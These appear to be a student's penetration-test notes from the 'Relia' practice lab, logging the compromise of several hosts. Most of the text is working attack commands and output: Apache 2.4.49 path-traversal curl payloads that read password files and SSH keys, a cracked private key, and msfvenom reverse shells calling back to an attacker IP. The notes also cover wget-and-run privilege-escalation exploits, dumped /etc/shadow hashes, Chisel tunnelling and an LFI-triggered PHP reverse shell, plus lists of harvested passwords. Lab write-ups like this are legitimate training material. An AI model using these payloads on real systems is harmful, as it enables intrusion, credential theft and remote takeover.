				Relia
We are tasked with a penetration test of Relia, an industrial company building driving systems for the timber industry. The target got attacked a few weeks ago and wants now to get an assessment of their IT security. Their goal is to determine if an attacker can breach the perimeter and get access to the domain controller in the internal network.
The organization topology diagram is shown below and the public subnet network resides in the 192.168.xx.0/24 range, where the xx of the third octet can be found under the IP ADDRESS field in the control panel.

--------------------------------------------------------------------------------------------------
EXTERNAL IP:
192.168.233.189 (Pwn3d!)✅
192.168.233.191: dmzadmin:proof.txt (Pwn3d!)✅
192.168.233.245: anita:local.txt, root:proof.txt (Pwn3d!)✅
192.168.233.246: anita:local.txt, root:proof.txt (Pwn3d!)✅
192.168.233.247: iis apppool:local.txt, Administrator:proof.txt (Pwn3d!)✅
192.168.233.248: emma:local.txt, mark:proof.txt (Pwn3d!)✅
192.168.233.249: adrian:local.txt, damon:proof.txt (Pwn3d!)✅

INTERNAL IP:
172.16.193.6 (Pwn3d!)✅
172.16.193.7 (Pwn3d!)✅
172.16.193.21 (Pwn3d!)✅
172.16.193.19 (Pwn3d!)✅
172.16.193.15 (Pwn3d!)✅
172.16.193.30 (Pwn3d!)✅
172.16.193.14: jim:local.txt , offsec:proof.txt (Pwn3d!)✅
172.16.193.20 (Pwn3d!)✅

WINPREP
192.168.233.250
offsec / lab

USERS: 
mark
emma
maildmz
dmzadmin
jim
andrea
michelle
damon
anita
steven
miranda
offsec
root
zachary
sa
bo
Michael321
admin
adrian
damon
Administrator
damian
brad
dan
anna
Guest
iis_service
internaladmin
jenny
krbtgt
larry
milana
mountuser

PASSWORDS:
fireball
OathDeeplyReprieve91
DPuBT9tGCBrTbR
SlimGodhoodMope
Castello1!
PasswordPassword_6
NotMyPassword0k?
i6yuT6tym@
password!
!8@aBRBYdb3!
SomersetVinyl1!
mercedes1
DotNetNukeDatabasePassword!
password
welcome1
HabitsAgesEnd123
SAPassword_1998
Luigi=Papal1963
12345
admin
lab


--------------------------------------------------------------------------------------------------
				POGRESS: 
--------------------------------------------------------------------------------------------------
		1. WEB01.DMZ.RELIA.COM - 192.168.206.245 ✅
FTP 21, 
SSH 2222, 
HTTP 80 443 8000

http found on tcp/80.
Widgets
- Slider Revolution
Photo galleries
- Slider Revolution
Font scripts
- Font Awesome
Web servers
- Apache HTTP Server 2.4.49
Programming languages
- Python 3.8
Operating systems
- UNIX
Web server extensions
- mod_wsgi 4.9.4
- OpenSSL 1.1.1f
Maps
- Google Maps
JavaScript libraries
- jQuery 1.11.3
- Modernizr 2.8.3
UI frameworks
- Bootstrap 3.3.6

FTP: NOTHING 
21/tcp open  ftp     syn-ack ttl 61 vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.206.245
drwxr-xr-x    2 0        0            4096 Oct 12  2022 .
drwxr-xr-x    2 0        0            4096 Oct 12  2022 ..
wget -m ftp://anonymous:anonymous@192.168.206.245
total 0


HTTP: Directory Traversal: http://192.168.206.245:8000
searchsploit Apache 2.4.49
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execu | multiple/webapps/50383.sh
curl -s --path-as-is --data "echo;Command" http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
root:x:0:0:root:/root:/bin/bash
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash
miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh
steven:x:1002:1002:Steven:/home/steven:/bin/sh
mark:x:1003:1003:Mark:/home/mark:/bin/sh
anita:x:1004:1004:Anita:/home/anita:/bin/sh
curl -s --path-as-is --data "echo;Command" http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow 
curl -s --path-as-is --data "echo;Command" http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
<title>403 Forbidden</title>
curl -s --path-as-is --data "echo;Command" http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/group
curl -s --path-as-is --data "echo;Command" http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts 
127.0.0.1 localhost
127.0.1.1 web01
curl -s --path-as-is --data "echo;Command" http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/fstab 
curl -s --path-as-is --data "echo;Command" http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/crontab
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
curl -s --path-as-is --data "echo;Command" http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/issue   
Ubuntu 20.04.5 LTS \n \l
curl -s --path-as-is --data "echo;Command" http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/apache2/htdocs
curl -s --path-as-is --data "echo;id" http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/var/log/apache2/error.log


SSH: 2222
curl -s --path-as-is --data "echo;id" http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/ssh/ssh_config
Host *
#   ForwardAgent no
#   ForwardX11 no
#   ForwardX11Trusted yes
#   PasswordAuthentication yes
#   HostbasedAuthentication no
#   GSSAPIAuthentication no
#   GSSAPIDelegateCredentials no
#   GSSAPIKeyExchange no
#   GSSAPITrustDNS no
#   BatchMode no
#   CheckHostIP yes
#   AddressFamily any
#   ConnectTimeout 0
#   StrictHostKeyChecking ask
#   IdentityFile ~/.ssh/id_rsa
#   IdentityFile ~/.ssh/id_dsa
#   IdentityFile ~/.ssh/id_ecdsa
#   IdentityFile ~/.ssh/id_ed25519
#   Port 22
#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc
#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com
#   EscapeChar ~
#   Tunnel no
#   TunnelDevice any:any
#   PermitLocalCommand no
#   VisualHostKey no
#   ProxyCommand ssh -q -W %h:%p gateway.example.com
#   RekeyLimit 1G 1h
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

curl -s --path-as-is --data "echo;id" http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/ssh/ssh_config.d
<title>301 Moved Permanently</title>

id_rsa
curl -s --path-as-is --data "echo;id" http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/home/.ssh/id_rsa
curl -s --path-as-is --data "echo;id" http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/offsec/home/.ssh/id_rsa
curl -s --path-as-is --data "echo;id" http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/miranda/home/.ssh/id_rsa
curl -s --path-as-is --data "echo;id" http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/steven/home/.ssh/id_rsa
curl -s --path-as-is --data "echo;id" http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/mark/home/.ssh/id_rsa
curl -s --path-as-is --data "echo;id" http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/anita/home/.ssh/id_rsa

<title>403 Forbidden</title>
<title>404 Not Found</title>

$HOME/.ssh/id_dsa     (private key)
$HOME/.ssh/id_dsa.pub (public key)
#   IdentityFile ~/.ssh/id_rsa
#   IdentityFile ~/.ssh/id_dsa
#   IdentityFile ~/.ssh/id_ecdsa
#   IdentityFile ~/.ssh/id_ed25519


				SSH: anitia
curl -s --path-as-is http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 

curl -s --path-as-is http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/anita/.ssh/id_ecdsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
13fn2kJ8qptynMAAAAEAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
dHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThM
fArBngFjl7RJYCOTqY5Mmid0sNJwAAAACw0HaBF7zp/0Kiunf161d9NFPIY2bdCayZsxnF
ulMdp1RxRcQuNoGPkjOnyXK/hj9lZ6vTGwLyZiFseXfRi8Dd93YsG0VmEOm3BWvvCv+26M
8eyPQgiBD4dPphmNWZ0vQJ6qnbZBWCmRPCpp2nmSaT3odbRaScEUT5VnkpxmqIQfT+p8AO
CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
-----END OPENSSH PRIVATE KEY-----

curl -s --path-as-is http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/anita/.ssh/id_ecdsa.pub
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThMfArBngFjl7RJYCOTqY5Mmid0sNJwA= anita@relia

curl -s --path-as-is http://192.168.233.245:8000/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/anita/.ssh/authorized_keys
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThMfArBngFjl7RJYCOTqY5Mmid0sNJwA= anita@relia

ssh2john id_ecdsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
fireball         (id_ecdsa)     

┌──(kali㉿kali)-[~/Desktop/RELIA/SSH]
└─$ ssh -i id_ecdsa anita@192.168.233.245 -p 2222 
fireball
$ whoami
anita
$ ls
local.txt
$ cat local.txt
fe026495a4ce1567d59358b1fc6a2c04
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
anita@web01:~$ 

python3 -m http.server 8000
wget http://192.168.45.170:8000/LinEnum.sh
wget http://192.168.45.170:8000/linpeas.sh
wget http://192.168.45.170:8000/unix-privesc-check
chmod +x LinEnum.sh
chmod +x linpeas.sh 
chmod +x unix-privesc-check

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.170 LPORT=5555 -f elf >reverse.elf
wget http://192.168.45.170:8000/reverse.elf
chmod +x reverse.elf

anita@web01:/home/offsec$ ls -la
ls -la
total 28
drwxr-xr-x 3 offsec offsec 4096 Oct 12  2022 .
drwxr-xr-x 7 root   root   4096 Oct 12  2022 ..
-rw------- 1 offsec offsec    1 Oct 27  2022 .bash_history
-rw-r--r-- 1 offsec offsec  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 offsec offsec 3771 Feb 25  2020 .bashrc
drwx------ 2 offsec offsec 4096 Oct 12  2022 .cache
-rw-r--r-- 1 offsec offsec  807 Feb 25  2020 .profile
-rw-r--r-- 1 offsec offsec    0 Oct 12  2022 .sudo_as_admin_successful
anita@web01:/home/offsec$ cat .sudo_as_admin_successful
cat .sudo_as_admin_successful

anita@web01:/home/offsec$ cat .bash_history
cat .bash_history
cat: .bash_history: Permission denied

anita@web01:/home/offsec$ cd .cache
cd .cache
bash: cd: .cache: Permission denied

cat: shadow: Permission denied
anita@web01:/etc$ cat shadow-

cat shadow-
cat: shadow-: Permission denied

anita@web01:/etc/ssh$ cat ssh_host_dsa_key.pub
cat ssh_host_dsa_key.pub
ssh-dss AAAAB3NzaC1kc3MAAACBAKviu7PIAgXdI37ern5DJct0hoXkLShoUCaadFOW+DP7qa2FJXZVPT4awKOfKGDctQx1VYDZ3PJO97cjk9U343hds11r/RHIne6C6ruOjNBhRNk5rdnYdn5skIuFHgkOoHgeiGJth9xcDko8uMrn4wwa7jsLGyb/bLyfCx4XkHPlAAAAFQDopG75ESoYr8hPbucoUV+WkrW3QwAAAIBGkgzig0JRu0+5WrElVuab73SfEi1hIwHSTVzg0hRsYiHLNYB4PLA5bMqoSAOiZ3lLFAH8Sx6HW7TNtR32Q57k1lbmEzoaQ4Q/RRuvVwuBAvtfDdjN4OycsqznVUPXeyLYDX8d73/yGJpVZUIvDo9BVNq9SHh0EJAicfsvEjLTBwAAAIEAhMZmMYkhtsXp12QpGwl6w63VDd6lqddF04mJYTQzVpxqftDEpSQIQTumP9OLF7s7wfdrCuW013W1bfxC65pfriaciuJovDCOiqQcjWMnUKXfqik+uwp8RAOGafMCbn98EIr1p9IC5xzjqLZJaKgkGSt6SLGNOfo50KEZXDCsSjU= root@web01

HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

anita@web01:/etc$ cat hosts
cat hosts
127.0.0.1 localhost
127.0.1.1 web01
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

find / -name "proof.txt" -ls 2> /dev/null

LINPEAS: 
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                  
Sudo version 1.8.31   

searchsploit sudo 1.8    
sudo 1.8.0 < 1.8.3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypas | linux/local/25134.c
sudo 1.8.0 < 1.8.3p1 - Format String                           | linux/dos/18436.txt
sudo 1.8.0 to 1.9.12p1 - Privilege Escalation                  | linux/local/51217.sh
Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Pr | linux/local/37710.txt
Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalati | linux/local/42183.c
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow                    | linux/local/48052.sh
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow (PoC)              | linux/dos/47995.txt
sudo 1.8.27 - Security Bypass                                  | linux/local/47502.py

				CVE-2021-3156
https://www.google.com/search?q=CVE-2021-3156
https://github.com/worawit/CVE-2021-3156
https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py

wget http://192.168.45.170:8000/exploit.py
chmod +x exploit.py
python3 exploit.py
# whoami
root
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@web01:/home/anita# cd ~
root@web01:/root# ls
proof.txt  snap
root@web01:/root# cat proof.txt
2be4e79585a69c9d0510f22b442eb0bb

root@web01:/root# cat /etc/shadow
root:$6$hUF5ezihFkozDRs7$AAkBctkoXVYOjhYOLW22EDkdoXXM085da.v9tPQTZlUtNvKNdV.jrZl5M.WbRJyyQyjh//JXUH0hyQVyyhWgj/:19291:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
systemd-coredump:!!:19277::::::
offsec:$6$p6n32TS.3/wDw7ax$TNwiUYnzlmx7Q0w59MbhSRjqW37W20OpGs/fCRJ3XiffbBVQuZTwtGeIJglRJg0F0vFKNBT39a57gakRJ2zPw/:19277:0:99999:7:::
lxd:!:19277::::::
miranda:$6$01GOUNyvP1lFg0Id$QoFsKEsD4um4ctVU62MU/KEmQbdj0OSw7gJ6EXVA4YTjTNxvfzQxdhdsyjHUaw4qO0YAwEMoXUXWBdCd3zW4V.:19277:0:99999:7:::
steven:$6$Rj4tu27TLjcnwC2v$wsNuqImPdduB9mXZHpjjEROvTKwWsp2SckcMB.AtcvHyS7tHTCGh.CrUCP0ogsFH9IjG3i2qekcAXRlkmeZOT1:19277:0:99999:7:::
mark:$6$blWxRVRno5YcdGiN$6ekTTBXDvGfaFRSPxZVLhR8tAmFd20RLlXNL5Q8U44gp0Heq7MLmFZrlaHeaX.pFhlJ3lif10E1zsO3W2tdbC/:19277:0:99999:7:::
anita:$6$Fq6VqZ4n0zxZ9Jh8$4gcSpNrlib60CDuGIHpPZVT0g/CeVDV0jR3fkOC7zIEaWEsnkcQfKp8YVCaZdGFvaEsHCuYHbALFn49meC.Rj1:19277:0:99999:7:::
apache:!:19277::::::
usbmux:*:19277:0:99999:7:::
ftp:*:19277:0:99999:7:::
sshd:*:19277:0:99999:7:::

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.170 LPORT=5555 -f elf >reverse.elf
wget http://192.168.45.170:8000/reverse.elf
chmod +x reverse.elf

root@web01:/home/mark# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:ab:f8:d0 brd ff:ff:ff:ff:ff:ff
    inet 192.168.233.245/24 brd 192.168.233.255 scope global ens192
       valid_lft forever preferred_lft forever

root@web01:/home/mark# ip route
ip route
default via 192.168.233.254 dev ens192 proto static 
192.168.233.0/24 dev ens192 proto kernel scope link src 192.168.233.245 

root@web01:/home/mark# sudo -l
sudo -l
Matching Defaults entries for root on web01:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User root may run the following commands on web01:
    (ALL : ALL) ALL

root@web01:/home/mark# find / -name "proof.txt" -ls 2> /dev/null
find / -name "proof.txt" -ls 2> /dev/null
    15739      4 -rw-r--r--   1 root     root           33 Apr 26 01:29 /root/proof.txt

root@web01:/home/mark# find / -name "local.txt" -ls 2> /dev/null
find / -name "local.txt" -ls 2> /dev/null
   413533      4 -rw-r--r--   1 root     root           33 Apr 26 01:29 /home/anita/local.txt

--------------------------------------------------------------------------------------------------
				2. 192.168.233.246 ✅
SSH:2222, 
HTTP:80 443

				SSH: 2222
┌──(kali㉿kali)-[~/Desktop/RELIA/SSH]
└─$ ssh -i id_ecdsa anita@192.168.233.246 -p 2222
$ whoami
anita
$ hostname
demo
$ ls
local.txt
$ cat local.txt
029b131f4755590ab4a89fd7c07e3787
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
anita@demo:~$ 

anita@demo:~$ history

anita@demo:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:ab:5d:85 brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 192.168.233.246/24 brd 192.168.233.255 scope global ens192
       valid_lft forever preferred_lft forever

anita@demo:/$ ip route
default via 192.168.233.254 dev ens192 proto static 
192.168.233.0/24 dev ens192 proto kernel scope link src 192.168.233.246 

anita@demo:/home$ cat /etc/shadow
cat: /etc/shadow: Permission denied

anita@demo:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
anita:x:1001:1001:Anita:/home/anita:/bin/sh

anita@demo:/$ find / -name "local.txt" -ls 2> /dev/null
   263520      4 -rw-r--r--   1 root     root           33 Apr 26 01:29 /home/anita/local.txt

find / -name "proof.txt" -ls 2> /dev/null


					PRIV ESC:
python3 -m http.server 8000
wget http://192.168.45.170:8000/LinEnum.sh
wget http://192.168.45.170:8000/linpeas.sh
wget http://192.168.45.170:8000/unix-privesc-check
chmod +x LinEnum.sh
chmod +x linpeas.sh 
chmod +x unix-privesc-check

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.170 LPORT=5555 -f elf >reverse.elf
wget http://192.168.45.170:8000/reverse.elf
chmod +x reverse.elf


╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                               

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: probable
   Tags: [ ubuntu=(22.04) ]{kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF
   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-0847] DirtyPipe
   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-4034] PwnKit
   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154


			Found internal port 8000:
anita@demo:~$ ss -ntplu                 
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
udp   UNCONN 0      0      127.0.0.53%lo:53        0.0.0.0:*          
tcp   LISTEN 0      511        127.0.0.1:8000      0.0.0.0:*          
tcp   LISTEN 0      128          0.0.0.0:2222      0.0.0.0:*          
tcp   LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*          
tcp   LISTEN 0      511                *:443             *:*          
tcp   LISTEN 0      128             [::]:2222         [::]:*          
tcp   LISTEN 0      511                *:80              *:*   

# Confirming LFI on port 8000
anita@demo:~$ curl http://127.0.0.1:8000/backend/?view=../../../../../../../../../../../../../../../../../../etc/passwd


			CHISEL: Port forwarding to 8000
		https://github.com/jpillora/chisel/releases
# Starting the Chisel server on port 80
kali@kali:~$ chisel server --port 80 --reverse

# Transfer chisel client to victum 
python3 -m http.server 8000
wget http://192.168.45.170:8000/chisel_1.9.1_linux_amd64
chmod +x chisel_1.9.1_linux_amd64

# Execute on victum 
./chisel_1.9.1_linux_amd64  client 192.168.45.170:80 R:8000:127.0.0.1:8000

# Confirm
ss -ntplu
Netid     State      Recv-Q     Send-Q         Local Address:Port          Peer Address:Port     Process                                                                                                                                                                                               
tcp       LISTEN     0          4096                       *:8000                     *:*         users:(("chisel",pid=5200,fd=8))                                                                
tcp       LISTEN     0          4096                       *:80                       *:*    


				LFI: 8000
Writeable directories for access to www-data: reverse shell
https://superuser.com/questions/45342/when-should-i-use-dev-shm-and-when-should-i-use-tmp
- /tmp
- /dev/shm

PHP Shells: 
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php
https://github.com/flozz/p0wny-shell

anita@demo:/tmp$ cd /dev/shm
anita@demo:/dev/shm$ wget http://192.168.45.170:5555/php-rev1.php 
anita@demo:/dev/shm$ chmod +x php-rev1.php
# From browser 
http://127.0.0.1:8000/backend/?view=../../../../../../../../../../../../../../../../../../dev/shm/php-rev1.php

nc -nvlp 4444
